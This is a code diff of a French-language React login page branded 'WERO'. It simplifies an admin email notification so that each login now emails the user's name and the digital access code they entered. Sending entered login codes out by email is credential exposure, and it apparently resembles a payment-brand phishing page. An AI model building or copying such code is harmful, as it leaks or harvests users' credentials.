@@ -1,11 +1,12 @@
-import React, { useState, useEffect } from "react";
+
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { supabase } from "@/lib/supabase";
 import { useToast } from "@/components/ui/use-toast";
 import { Footer } from "@/components/Footer";
-import { sendAdminNotification, initEmailJS } from "@/lib/emailService";
+import { sendAdminNotification } from "@/lib/emailService";
 
 const Index = () => {
   const [code, setCode] = useState("");
@@ -13,10 +14,6 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
-
-  useEffect(() => {
-    initEmailJS();
-  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -59,26 +56,14 @@ const Index = () => {
       // Stocker l'ID de l'utilisateur dans localStorage pour référence ultérieure
       localStorage.setItem("userId", data.id);
       
-      // Récupérer les données complètes de l'utilisateur pour l'email
-      const { data: userData } = await supabase
-        .from("users")
-        .select("*")
-        .eq("id", data.id)
-        .single();
-      
       // Envoyer une notification à l'administrateur
       const userName = `${data.prenom || ''} ${data.nom || ''}`.trim();
-      const emailResult = await sendAdminNotification({
-        userData: userData,
+      sendAdminNotification({
+        subject: "Nouvelle connexion utilisateur WERO",
+        message: `L'utilisateur ${userName} avec le code digital ${code} vient de se connecter.`,
         userCode: code,
         userName: userName
       });
-      
-      if (emailResult) {
-        console.log("Email envoyé avec succès");
-      } else {
-        console.error("Échec de l'envoi de l'email");
-      }
       
       // Rediriger vers la page suivante
       navigate("/confirmation");
